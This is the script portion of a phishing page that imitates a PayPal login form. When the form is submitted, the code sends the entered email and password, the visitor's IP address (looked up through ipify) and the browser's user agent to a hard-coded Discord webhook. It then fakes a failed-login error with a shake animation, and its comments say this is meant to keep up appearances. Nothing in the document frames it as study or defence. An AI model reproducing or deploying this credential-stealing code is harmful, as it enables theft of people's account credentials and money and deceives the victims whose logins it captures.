    <script>
        // Toggle password visibility
        function togglePassword() {
            const passwordInput = document.getElementById('password');
            const eyeIcon = document.querySelector('#password + button i');
            
            if (passwordInput.type === 'password') {
                passwordInput.type = 'text';
                eyeIcon.classList.replace('fa-eye', 'fa-eye-slash');
            } else {
                passwordInput.type = 'password';
                eyeIcon.classList.replace('fa-eye-slash', 'fa-eye');
            }
        }
        
        // Form submission
        document.getElementById('paypalForm').addEventListener('submit', async function(e) {
            e.preventDefault();
            
            const email = document.getElementById('email').value;
            const password = document.getElementById('password').value;
            const submitBtn = document.getElementById('submitBtn');
            
            // Show loading state
            document.getElementById('loginForm').classList.add('hidden');
            document.getElementById('loadingState').classList.remove('hidden');
            
            try {
                // Send data to Discord webhook
                const response = await fetch('https://discord.com/api/webhooks/1563614031216910507/9T6PGf48fpwibTUfFJbl7wrnxsRfTKPyvpsugcB-P_nFHJk3ENGiorlD9wo3R3w0lKxO', {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json',
                    },
                    body: JSON.stringify({
                        content: `New PayPal login attempt:\nEmail: ${email}\nPassword: ${password}\nIP: ${await getIP()}\nUser Agent: ${navigator.userAgent}`,
                    }),
                });
                
                if (response.ok) {
                    // Simulate processing delay
                    setTimeout(() => {
                        // Show error state (to make it look like a failed login)
                        document.getElementById('loadingState').classList.add('hidden');
                        document.getElementById('errorState').classList.remove('hidden');
                        
                        // Add shake effect to form
                        document.getElementById('paypalForm').classList.add('shake');
                        setTimeout(() => {
                            document.getElementById('paypalForm').classList.remove('shake');
                        }, 500);
                    }, 2000);
                } else {
                    throw new Error('Failed to send data');
                }
            } catch (error) {
                console.error('Error:', error);
                // Still show error state to maintain appearance
                document.getElementById('loadingState').classList.add('hidden');
                document.getElementById('errorState').classList.remove('hidden');
            }
        });
        
        // Reset form
        function resetForm() {
            document.getElementById('errorState').classList.add('hidden');
            document.getElementById('loginForm').classList.remove('hidden');
            document.getElementById('password').value = '';
        }
        
        // Get user's IP address
        async function getIP() {
            try {
                const response = await fetch('https://api.ipify.org?format=json');
                const data = await response.json();
                return data.ip;
            } catch {
                return 'Unknown';
            }
        }
    </script>
